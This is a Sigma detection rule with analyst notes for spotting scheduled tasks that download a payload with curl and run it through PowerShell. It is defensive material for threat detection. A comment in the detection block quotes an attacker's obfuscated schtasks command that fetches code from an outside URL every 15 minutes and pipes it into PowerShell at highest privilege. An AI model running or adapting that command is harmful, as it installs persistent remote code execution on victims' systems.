title: Scheduled Task Creation with Curl and PowerShell Execution Combo
id: 1d174d38-8fda-4081-a9b6-56d9763c0cd8
status: experimental
description: |
  Detects the creation of a scheduled task using schtasks.exe, potentially in combination with curl for downloading payloads and PowerShell for executing them.
  This facilitates executing malicious payloads or connecting with C&C server persistently without dropping the malware sample on the host.
references:
- https://tria.ge/241015-l98snsyeje/behavioral2
author: Swachchhanda Shrawan Poudel (Nextron Systems)
date: 2025-02-05
tags:
- attack.privilege-escalation
- attack.execution
- attack.persistence
- attack.stealth
- attack.t1053.005
- attack.t1218
- attack.command-and-control
- attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
    # Example: cmd start /min /c schtasks /create /tn PolicyConverter /sc minute /mo 15 /tr "conhost --headless cmd /v:on /c set a=https&set b=inh&set c=ostne&set d=tservice.co&set e=!a!://www.!b!!c!!d!m& curl -o - !e!/mscu/lokc.php?wl=HGNBWBGW**Admin | powershell" /rl Highest
  selection_img:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|windash: ' /create '
  selection_curl:
    CommandLine|contains|all:
    - 'curl '
    - 'http'
    - '-o'
  selection_powershell:
    CommandLine|contains: 'powershell'
  condition: all of selection_*
falsepositives:
- Legitimate use of schtasks for administrative purposes.
- Automation scripts combining curl and PowerShell in controlled environments.
level: medium
note: |
  ### Technical Context

  This Sigma rule detects the creation of scheduled tasks using `schtasks.exe` that leverages `curl` to download potential malicious payloads and subsequently execute them via PowerShell. This behavior indicates an attempt to establish persistence on the system while minimizing the footprint of malware by directly executing the payloads, which may connect to a command-and-control server. The relevant MITRE ATT&CK tactics include Persistence (T1053.005) and Execution (T1218). The primary telemetry sources required for this detection are Windows process creation logs, specifically looking for Event ID 4688 (process creation) and related command-line activity. If malicious, this could lead to unauthorized access or control of the target system. Importantly, the detection does NOT confirm malicious intent on its own; legitimate administrative use of these commands may trigger the alert.

  ### Investigation Steps

  - **Review process creation logs:**
    Examine Windows Security Event ID 4688 for instances of `schtasks.exe` with command-line arguments that include `/create`. Look specifically for command lines containing both `curl` and `powershell` to establish potential malicious intent.

  - **Identify command-line arguments:**
    Check the `CommandLine` field for `curl` combined with `http`, especially if followed by the `-o` flag. A typical benign command will lack suspicious URLs or indicate a known safe repository.

  - **Evaluate the scheduled task details:**
    Review the Task Scheduler for newly created tasks to understand their execution context, frequency, and legitimacy. Legitimate tasks may have clear names and descriptions, while malicious ones typically have generic or obfuscated names.

  - **Correlate with network logs:**
    Inspect proxy logs for outbound requests made to the URL identified in the command line. Look for any connections to unusual or newly registered domains that may indicate a command-and-control server.

  - **Check for other related activities:**
    Analyze surrounding logs for other suspicious behavior, such as unusual PowerShell execution patterns (Event ID 4104 for PowerShell logs), particularly from unexpected user accounts or systems.

  - **Create a baseline of legitimate operational behavior:**
    Establish normal usage patterns for administrative tasks within your environment, documenting typical command structures. Compare this baseline to the detected activities, identifying potential anomalies.

  ### Prioritization

  This alert should be considered medium severity due to its potential impact on systems capable of executing scheduled tasks and connecting to external URLs. The likelihood of malicious abuse is moderate, as this technique is increasingly used by adversaries to bypass traditional security measures. Such combinations of scheduled tasks to download and execute payloads are commonly weaponized.

  ### Blind Spots and Assumptions

  Detection may be limited by environments that use legitimate automation scripts involving `schtasks`, `curl`, and PowerShell. Required log sources include Windows Process Creation and potentially Task Scheduler logs for comprehensive insight. Legitimate administrative tasks can trigger alerts, challenging the categorization of observed behavior as malicious. Strengthening detection coverage may involve complementary rules for identifying unusual PowerShell activity or irregular outbound network connections related to the tasks.

